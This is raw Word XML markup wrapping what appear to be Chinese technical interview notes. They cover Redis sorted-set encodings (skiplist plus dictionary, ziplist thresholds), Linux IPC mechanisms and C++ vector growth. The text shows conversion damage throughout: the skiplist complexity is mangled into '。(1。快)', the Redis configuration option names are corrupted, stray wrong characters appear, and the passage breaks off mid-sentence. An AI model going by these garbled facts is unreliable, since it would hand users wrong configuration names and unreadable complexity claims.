                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t xml:space="preserve">-A </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t xml:space="preserve">亠 </w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
                        </w:rPr>
                        <w:t>g</w:t>
                      </w:r>
                      <w:r>
                        <w:rPr>
                          <w:color w:val="000000"/>
                          <w:spacing w:val="0"/>
                          <w:w w:val="100"/>
                          <w:position w:val="0"/>
                          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
                        </w:rPr>
                        <w:t>-亠</w:t>
                      </w:r>
                      <w:bookmarkEnd w:id="330"/>
                      <w:bookmarkEnd w:id="331"/>
                      <w:bookmarkEnd w:id="332"/>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
                <w10:wrap type="topAndBottom"/>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r>
        <w:drawing>
          <wp:anchor distT="1304925" distB="57150" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>5574030</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1304925</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="447675" cy="876300"/>
            <wp:effectExtent l="0" t="0" r="9525" b="0"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="50" name="Shape 50"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="50" name="Shape 50"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId39"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="447675" cy="876300"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
      <w:r>
        <w:drawing>
          <wp:anchor distT="1123950" distB="323850" distL="0" distR="0" simplePos="0" relativeHeight="125830144" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="page">
              <wp:posOffset>6069330</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>1123950</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="238125" cy="790575"/>
            <wp:effectExtent l="0" t="0" r="9525" b="9525"/>
            <wp:wrapTopAndBottom/>
            <wp:docPr id="52" name="Shape 52"/>
            <wp:cNvGraphicFramePr/>
            <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
                  <pic:nvPicPr>
                    <pic:cNvPr id="52" name="Shape 52"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId40"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="238125" cy="790575"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="184" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:line="1" w:lineRule="exact"/>
        <w:sectPr>
          <w:footnotePr>
            <w:numFmt w:val="decimal"/>
          </w:footnotePr>
          <w:type w:val="continuous"/>
          <w:pgSz w:w="11900" w:h="16840"/>
          <w:pgMar w:top="1475" w:right="0" w:bottom="1460" w:left="0" w:header="0" w:footer="3" w:gutter="0"/>
          <w:cols w:space="720" w:num="1"/>
          <w:rtlGutter w:val="0"/>
          <w:docGrid w:linePitch="360" w:charSpace="0"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>skiplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码同时使用跳跃表和字典实现的原因</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="330" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>跳跃表优点是有序，但是查询分值复杂度为。(1。快)；字典查询分值复杂度为。(1), 但是无序，所以结合连个结构的有点进行实现。</w:t>
      </w:r>
    </w:p>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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>虽然采用两个结构但是集合的元素成员和分值是共享的，两种结构通过指针指向同一地 址，不会浪费内存。</w:t>
      </w:r>
    </w:p>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TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有序集合编码转换：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>有序集合对象使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ziplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码需要满足两个条件：一是所有元素长度小于64字节； 二是元素个数小于128个：不满足任意一条件将使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>skiplist</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编码。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:hanging="400"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>以上两个条件可以在</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>Redis</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>配置文件中修改</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>zset-max-ziplisLentries</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">选项和 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">zset"max"zipl is t" value </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>选项</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="470" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="103" w:name="bookmark112"/>
      <w:bookmarkEnd w:id="103"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>linuxT IPC</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="021E3F"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>有哪些</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1195"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="104" w:name="bookmark113"/>
      <w:bookmarkEnd w:id="104"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>匿名管道</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(PIPE)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和有名管道</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(FIFO)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:最简单</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1195"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="105" w:name="bookmark114"/>
      <w:bookmarkEnd w:id="105"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>信号</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(SIGNAL)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:系统的开销最小</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="18"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="1195"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="106" w:name="bookmark115"/>
      <w:bookmarkEnd w:id="106"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>共享映射区</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(MMAP)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:可以在无血缘关系的进程间通信</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="480" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="800"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>㈤本地套接字</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>(SOCKET)</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>:最稳定(但是比较复杂)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="13"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="16"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="575"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="470" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="107" w:name="bookmark116"/>
      <w:bookmarkEnd w:id="107"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="30"/>
          <w:szCs w:val="30"/>
        </w:rPr>
        <w:t>内存增长方式</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>的实现通常会分配比新的空间需求更大的内存空间。容器预留这些空间作为备 用，从而用来保存更多新的元素。这样，就不需要每次添加新的元素都重新分配容器的 内存空间了。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>在插入新元素时，若谒到已分配容量不足的情况，会自动拓展容量大小，而这个拓展容 量的过程为：</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="285" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">幵辟另外一块更大的内存空间，该空间大小通常为原空间大小的两倍(理论分析上是 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>1.5</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>最好，但从时间和空间上综合考虑，一般取2);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>将原内存空间中的数据拷贝到新开辟的内存空间中；</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>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zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>析构原内存空间的数据，释放原内存空间，并调整各种指针指向新内存空间。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="300" w:lineRule="exact"/>
        <w:ind w:left="400" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">类型提供了一些成员函数，允许我们与它的现实中内存分配部分互动。 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>c.capacity()</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>不重新分配内存空间的话，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
